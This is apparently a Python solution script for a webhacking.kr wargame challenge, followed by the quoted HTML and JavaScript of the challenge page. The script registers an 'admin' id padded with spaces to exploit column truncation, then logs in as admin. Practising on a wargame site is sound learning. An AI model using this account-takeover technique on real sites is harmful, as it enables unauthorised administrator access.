# escape POST id,pw
# select id,pw from users where id={$_POST['id']} and pw={$_POST['pw']};

import requests
from phpsessid import cookies

url = 'https://webhacking.kr/challenge/web-05/mem/join.php?mode=1'
cookies['oldzombie'] = ''

buf = ' ' * 64 + 'asdf'
data = {'id':'admin'+buf, 'pw':'admin'}
response = requests.post(url, cookies=cookies, data=data)
print(response.text)

url = 'https://webhacking.kr/challenge/web-05/mem/login.php'
data = {'id':'admin', 'pw':'admin'}
response = requests.post(url, cookies=cookies, data=data)
print(response.text)

"""
<html>
<script>
l='a';ll='b';lll='c';llll='d';lllll='e';llllll='f';lllllll='g';llllllll='h';lllllllll='i';llllllllll='j';lllllllllll='k';llllllllllll='l';lllllllllllll='m';llllllllllllll='n';lllllllllllllll='o';llllllllllllllll='p';lllllllllllllllll='q';llllllllllllllllll='r';lllllllllllllllllll='s';llllllllllllllllllll='t';lllllllllllllllllllll='u';llllllllllllllllllllll='v';lllllllllllllllllllllll='w';llllllllllllllllllllllll='x';lllllllllllllllllllllllll='y';llllllllllllllllllllllllll='z';I='1';II='2';III='3';IIII='4';IIIII='5';IIIIII='6';IIIIIII='7';IIIIIIII='8';IIIIIIIII='9';IIIIIIIIII='0';li='.';ii='<';iii='>';

lIllIllIllIllIllIllIllIllIllIl="oldzombie";
lIIIIIIIIIIIIIIIIIIl="document.cookie";

// need to have a cookie of key "oldzombie"
if(eval(lIIIIIIIIIIIIIIIIIIl).indexOf(lIllIllIllIllIllIllIllIllIllIl)==-1) {
        alert('bye');
        throw "stop";
}

if(eval(document.URL).indexOf("mode=1")==-1){
        alert('access_denied');
        throw "stop";
}else{
        document.write('<font size=2 color=white>Join</font><p>');
        document.write('.<p>.<p>.<p>.<p>.<p>');
        document.write('<form method=post action=join.php>');
        document.write('<table border=1><tr><td><font color=gray>id</font></td><td><input type=text name=id maxlength=20></td></tr>');
        document.write('<tr><td><font color=gray>pass</font></td><td><input type=text name=pw></td></tr>');
        document.write('<tr align=center><td colspan=2><input type=submit></td></tr></form></table>');}
</script>
</body>
</html>
"""
